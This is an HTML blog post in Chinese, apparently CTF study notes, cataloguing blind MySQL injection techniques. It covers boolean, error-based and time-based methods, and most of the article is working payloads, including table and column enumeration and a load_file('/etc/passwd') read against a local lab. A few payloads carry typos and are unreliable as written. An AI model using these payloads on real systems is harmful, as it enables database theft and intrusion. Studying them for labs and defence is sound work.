@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en-uk" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=''><title>SQL注入：盲注</title>
+
+<link rel='canonical' href='https://example.com/posts/sqli_blind_injection/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='SQL注入：盲注'>
+<meta property='og:description' content=''>
+<meta property='og:url' content='https://example.com/posts/sqli_blind_injection/'>
+<meta property='og:site_name' content='Under The Ginkgo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='SQLi' /><meta property='article:published_time' content='2022-03-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-03-27T15:48:21&#43;01:00'/>
+<meta name="twitter:title" content="SQL注入：盲注">
+<meta name="twitter:description" content="">
+    <link rel="shortcut icon" href="/img/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
+                            height="237" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧐</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
+            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/medic0803'
+                        target="_blank"
+                        title="A_GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:medicwrf@gmail.com'
+                        target="_blank"
+                        title="B_E-mail"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/sqli_blind_injection/">SQL注入：盲注</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 27, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="blind-injection">Blind injection</h2>
+<p>盲注的特点就在于页面不会显示返回任何有意义的信息，但是我们通过一些标识来得知注入语句是否被执行</p>
+<h3 id="布尔盲注">布尔盲注</h3>
+<p>通过构造一些布尔逻辑判断，查看页面是否发生变化来判断语句是否成功执行</p>
+<h4 id="left"><code>left()</code></h4>
+<p>left(database(),1)</p>
+<p>?id=1&rsquo;and left(version(),1)=5%23 #version 1st char</p>
+<p>?id=1&rsquo;and length(database())=8%23 # length match</p>
+<p>?id=1&rsquo; and left(database(), 1)&gt;&lsquo;a&rsquo; # database first char match</p>
+<p>?id=1&rsquo; and left(database(), 2)&gt;&lsquo;se&rsquo; # database first two chars match</p>
+<h4 id="substr-ascii"><code>substr()</code> <code>ascii()</code></h4>
+<p>ascii(subst((select table_name from information_schema.tables where tables_schema=database() limit 0,1),1,1)) = 101</p>
+<p>#table_name 1st char match</p>
+<p>Get database() = &ldquo;security&rdquo;</p>
+<p>?id=1&rsquo;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1),1,1)) &gt; 80</p>
+<p>?id=1&rsquo;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1),2,1)) &gt; 80</p>
+<p>?id=1&rsquo;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1, 1),1,1)) &gt; 80</p>
+<h4 id="regexp"><code>regexp</code></h4>
+<p>?id=1&rsquo; and 1=(select 1 from information_schema.columns where table_name=&lsquo;users&rsquo; and table_name regexp &lsquo;^[a-z]&rsquo; limit 0,1)&ndash; -</p>
+<p>?id=1&rsquo; and 1=(select 1 from information_schema.columns where table_name=&lsquo;users&rsquo; and column_name regexp &lsquo;^username&rsquo; limit 0,1)&ndash; -</p>
+<h4 id="like-匹配注入"><code>like</code> 匹配注入</h4>
+<p>select user() like &lsquo;ro%&rsquo;
+The percent sign (%) represents zero, one, or multiple characters
+The underscore sign (_) represents one, single character</p>
+<h4 id="ord-and-mid"><code>ORD()</code> and <code>MID()</code></h4>
+<p>?id=1&rsquo;and ORD(MID((select IFNULL(CAST(username as char), 0x20) from security.users order by id limit 0,1),1,1))=68</p>
+<h3 id="报错盲注">报错盲注</h3>
+<p>将有价值的信息通过报错的方式显示输出
+前提：页面有错误信息显示出来
+<a class="link" href="https://www.freebuf.com/articles/web/274019.html"  target="_blank" rel="noopener"
+    >https://www.freebuf.com/articles/web/274019.html</a></p>
+<h4 id="bigint数据类型溢出报错注入">BigInt数据类型溢出报错注入</h4>
+<p>exp(int)函数， <code>mysql版本(5.5.5 - 5.5.49)</code>  = e^[int]
+目的是要造成&quot;DOUBLE value is out of range&quot;的错误</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and exp(~(select * from (select user())a))-- -
+</span></span></code></pre></div><p>1.先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a
+2.然后在查询select * from a 查询a，将结果集a全部查询出来
+3.查询完成，语句成功执行，返回值为0，将0按位取反（&rsquo;~&rsquo;）获取，使exp调用的时候报错</p>
+<p>获取表名信息</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a))
+</span></span></code></pre></div><p>获取列名信息</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and exp(~(select * from (select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1)a))
+</span></span></code></pre></div><p>获取列名对应的信息</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and exp(~(select * from(select username from &#39;usres&#39; limit 0,1)))
+</span></span></code></pre></div><p>读取文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and exp(~(select * from (select load_file(&#39;/etc/passwd&#39;))a))
+</span></span></code></pre></div><p>注意：对于所有的insert、update和delete语句DIOS查询也同样可以使用 除了exp()函数之外，pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入</p>
+<h4 id="参数格式错误">参数格式错误</h4>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><code>updatexml()</code></p>
+<p><code>updatexml()</code> 函数利用的就是mysql函数参数格式错误进行报错注入</p>
+<p><code>updatexml()</code> 函数语法：updatexml(XML_document,Xpath_string,new_value);</p>
+<p>函数语法解析：</p>
+<p>XML_document:是字符串String格式，为XML文档对象名称</p>
+<p>Xpath_string:Xpath格式的字符串，例如：boostore, bookstore/book, <em>/book, bookstore//book, //@lang, /[/@\d]</em></p>
+<p>new_value:string格式，替换查找到的符合条件的数据</p>
+<p>适用版本是： <code>Mysql 5.1.5+</code></p>
+<p>利用方式：在执行两个函数时，如果出现xml文件路径错误，就会产生报错 那么我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错</p>
+<p>查询当前数据库的用户信息以及数据库版本信息</p>
+<p>?id=1&rsquo; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)&ndash; -
+根据上面对于Xpath_string的定义我们可以得知，当使用类似0x7e=&rsquo;~&lsquo;之类的额外字符的时候，会被认定为非Xpath，就会产生报错</p>
+<figure><img src="/ox-hugo/2022-03-23_20-38-37_screenshot.png" width="400px"/>
+</figure>
+
+<p>查询当前数据库名称及操作系统版本信息：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,database(),0x7e,@@version_compile_os,0x7e),3)-- -
+</span></span></code></pre></div><p>获取当前数据库下数据表信息：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3)-- -
+</span></span></code></pre></div><p>为啥不可以？</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),3)-- -
+</span></span></code></pre></div><p>注意
+: updatexml最多只能显示32位，需要配合SUBSTR使用</p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><code>extractvalue()</code></p>
+<p>函数语法:extractvalue(XML_document,XPath_string)</p>
+<p>适用的版本：5.1.5+</p>
+<p>利用的原理也是xpath格式不符报错注入</p>
+<p>获取当前是数据库名称及使用mysql数据库的版本信息：</p>
+<p>and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e))</p>
+<p>获取当前注入点的用户权限信息及操作系统版本信息：</p>
+<p>and extractvalue(1,concat(0x7e,@@version_compile_os,0x7e,user(),0x7e))</p>
+<p>获取当前位置所用数据库的位置：</p>
+<p>and extractvalue(1,concat(0x7e,@@datadir,0x7e))</p>
+<p>获取数据表信息:</p>
+<p>and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))</p>
+<p>获取users数据表的列名信息:</p>
+<p>and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&lsquo;users&rsquo; limit 0,1),0x7e))</p>
+<p>获取对应的列名的信息(username\password):</p>
+<p>and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e))</p>
+</li>
+</ul>
+<h4 id="主键重复">主键重复</h4>
+<p><a class="link" href="https://blog.csdn.net/m0%5F53065491/article/details/121893986"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/m0%5F53065491/article/details/121893986</a>
+这种方式可以实现报错的原因是：虚拟表的主键重复。</p>
+<p>首先，主键重复方式的报错注入利用的函数有： <code>floor()</code> +  <code>rand()</code>  + <code>group()</code> + <code>count()</code></p>
+<p>其中， <code>floor()</code> 函数的作用就是返回小于等于该值的最大整数，即向下取整，只保留整数部分
+因此 <code>floor(rand(0)*2))就表示包含0，1的数组</code></p>
+<p><code>count(*)</code> 函数是一个聚合函数 group by 语句与 <code>count()</code> 函数结合，根据一个或多个列对结果集进行分组</p>
+<p>主键重复报错注入原理：
+使用group by 会首先生成一个虚拟表，虚拟表有两个字短，key, count(*),key表示主键，这里就是 <code>concat(database(),floor(rand(0)*2)</code> 的值，首先查看 <code>concat(database(),floor(rand(0)*2)</code> 的值是否存在，这里将会进行第一次计算</p>
+<p>我们当然知道数据库中没有 <code>[security0, security2]</code> 这样的字段，这种情况下，会直接将 <code>concat(database(),floor(rand(0)*2)</code> 的值直接当作主键插入临时表中，同时count(*) + 1,这里就进行了第二次计算。</p>
+<p>那么继续第二条记录，如果第一次 <code>concat(database(),floor(rand(0)*2)</code> 的计算发现没有主键（比如已经插入了security1,但这次计算出来发现security0不存在），那么要进行插入，第二次计算 <code>concat(database(),floor(rand(0)*2)</code> ，但是计算的结果又变回了 security1，插入失败，主键重复，导致报错
+payload：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#
+</span></span><span class="line"><span class="cl">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+</span></span></code></pre></div><h3 id="时间盲注">时间盲注</h3>
+<h4 id="sleep"><code>sleep()</code></h4>
+<p>利用一些延时函数来造成响应时间的变化来，判断语句是否成功执行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">If</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">115</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="o">%</span><span class="mi">23</span><span class="w"> </span><span class="o">//</span><span class="k">if</span><span class="w"> </span><span class="err">判断语句，条件为假，</span><span class="w"> </span><span class="err">执行</span><span class="w"> </span><span class="n">sleep</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="n">find_in_set</span><span class="p">(</span><span class="n">mmid</span><span class="p">(</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="s1">&#39;0,1,2,3,4,5,6,7,8,9,.&#39;</span><span class="p">));</span><span class="w">
+</span></span></span></code></pre></div><p>该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可 取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</p>
+<h4 id="benchmark">benchmark()</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),benchmark(5000000000000000, sha(1),0)-- -
+</span></span></code></pre></div><p>通过时间长短的变化，判断语句是否执行成功，这是一种边信道攻击，在运行过程中占用大量的CPU资源，推荐使用sleep()</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Databse</th>
+<th>Expression</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mysql</td>
+<td>BENCHMARK(100000,MD5(1)) or sleep(5)</td>
+</tr>
+<tr>
+<td>Postgresql</td>
+<td>PG_SLEEP(5) OR GENERATE_SERIES(1,10000)</td>
+</tr>
+<tr>
+<td>Ms sql server</td>
+<td>WAITFOR DELAY ‘0:0:5’</td>
+</tr>
+</tbody>
+</table></div>
+<h4 id="笛卡尔积-heavy-query">笛卡尔积（heavy query）</h4>
+<p>通过查询多个表合集来造成大量的查询，导致查询时间变长造成延迟</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select username from users limit 0, 1),1,1)) &lt; 50 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -
+</span></span></code></pre></div><figure><img src="/ox-hugo/2022-03-24_19-54-12_screenshot.png" width="400px"/>
+</figure>
+
+<h4 id="get-lock">GET_LOCK</h4>
+<p><a class="link" href="https://blog.csdn.net/weixin%5F40006763/article/details/111687849"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/weixin%5F40006763/article/details/111687849</a>
+mysql_pconnect(server,user,pwd,clientflag)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mysqlp_connect() 函数 打开一个到 MySQL 服务器的持久连接 mysqlpconnect() 和 mysqlconnect() 非常相似，但有两个主要区别： 1、当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的(持久)连接， 如果找到，则返回此连接标识而不打开新连接。 2、当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用 (mysqlclose() 不会关闭由 mysql_pconnect() 建立的连接).
+</span></span></code></pre></div><p>get_lock(str,timeout)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Tries to obtain a lock with a name given by the string str, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name.get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。 在一个session中锁定变量，同时通过另外一个session执行，将会产生延时
+</span></span></code></pre></div><p>也就是说此方法只有在数据库的连接是持久连接的时候才能生效 举个栗子： 打开两个mysql的shell 现在一个shell中执行命令 select getlock(&lsquo;sdpc&rsquo;,5) 先上锁 然后另外一个shell中执行重复的命令 第二个shell中便出现延迟 延迟的时间由第二个shell的getlock中的参数决定.So，在我们写脚本的时候，先加锁，再进行盲注即可(使用requests库时注意加锁和盲注不要在同一个session下)</p>
+<h4 id="正则bug">正则bug</h4>
+<p><a class="link" href="https://xz.aliyun.com/t/2288"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/t/2288</a>
+这是一个老生常谈的问题了，但之前可能很少会把它放到注入里讨论。</p>
+<p>正则匹配在匹配较长字符串但自由度比较高的字符串时，会造成比较大的计算量，我们通过rpad或repeat构造长字符串，加以计算量大的pattern，通过控制字符串长度我们可以控制延时。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql&gt; select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);
+</span></span><span class="line"><span class="cl">+-------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">| rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) |
+</span></span><span class="line"><span class="cl">+-------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">|                                                           0 |
+</span></span><span class="line"><span class="cl">+-------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">1 row in set (5.22 sec)
+</span></span></code></pre></div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">ctf</a>
+        
+            <a href="/tags/sqli/">SQLi</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on Mar 27, 2022 15:48 BST
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 Under The Ginkgo
+    </section>
+    
+    <section class="powerby">
+        
+            Cogito, ergo sum <br/>
